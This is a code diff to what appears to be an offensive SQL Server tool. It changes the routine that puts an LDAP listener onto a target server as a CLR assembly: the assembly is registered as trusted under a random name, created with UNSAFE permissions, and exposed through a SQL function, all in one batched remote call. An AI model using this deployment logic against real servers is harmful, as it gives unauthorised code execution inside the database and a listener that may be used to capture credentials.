@@ -241,6 +241,8 @@ namespace MSSQLand.Services
             try
             {
 
+                string addTrustedQuery = string.Empty;
+
                 if (_databaseContext.QueryService.ExecutionServer.IsLegacy)
                 {
                     Logger.Info("IsLegacy server detected. Enabling TRUSTWORTHY property");
@@ -248,34 +250,30 @@ namespace MSSQLand.Services
                 }
                 else
                 {
-                    if (_databaseContext.ConfigService.RegisterTrustedAssembly(libraryHash, LibraryPath) == false)
+                    if (!_databaseContext.ConfigService.PrepareForTrustedAssembly(libraryHash))
                     {
-                        Logger.Error("Failed to register trusted assembly. Aborting execution.");
+                        Logger.Error("Failed to prepare trusted assembly slot. Aborting execution.");
                         return false;
                     }
+
+                    string assemblyDescription = $"{Utilities.ByteHelper.GetRandomIdentifier(6)}, version=0.0.0.0, culture=neutral, publickeytoken=null, processorarchitecture=msil";
+                    addTrustedQuery = ConfigurationService.GetTrustedAssemblyQuery(libraryHash, assemblyDescription) + "\n";
                 }
 
                 // Drop existing objects
                 _databaseContext.ConfigService.DropDependentObjects(AssemblyName);
 
-                // Drop existing objects
-                _databaseContext.QueryService.ExecuteNonProcessing(dropFunction);
-                _databaseContext.QueryService.ExecuteNonProcessing(dropAssembly);
-
-
-                // Deploy the assembly
+                // Batch sp_add_trusted_assembly + drop + create assembly + create function into one
+                // call so they execute in the same remote connection, avoiding DTC visibility issues.
                 Logger.Task("Deploying the LDAP server assembly");
                 _databaseContext.QueryService.ExecuteNonProcessing(
-                    $"CREATE ASSEMBLY [{AssemblyName}] AUTHORIZATION [dbo] FROM 0x{libraryHexBytes} WITH PERMISSION_SET = UNSAFE;");
-
-                Logger.Success($"LDAP server assembly '{AssemblyName}' created");
-
-                // Create the function
-                Logger.Task("Creating the LDAP server function");
-                _databaseContext.QueryService.ExecuteNonProcessing(
+                    $"{addTrustedQuery}" +
+                    $"DROP FUNCTION IF EXISTS [dbo].[{FunctionName}];\n" +
+                    $"DROP ASSEMBLY IF EXISTS [{AssemblyName}];\n" +
+                    $"CREATE ASSEMBLY [{AssemblyName}] AUTHORIZATION [dbo] FROM 0x{libraryHexBytes} WITH PERMISSION_SET = UNSAFE;\n" +
                     $"CREATE FUNCTION [dbo].[{FunctionName}](@port int, @timeoutSeconds int) RETURNS NVARCHAR(MAX) AS EXTERNAL NAME {AssemblyName}.[ldapAssembly.LdapSrv].Listen;");
 
-                Logger.Success($"LDAP server function '{FunctionName}' created");
+                Logger.Success($"LDAP server assembly '{AssemblyName}' and function '{FunctionName}' deployed");
 
                 return true;
             }
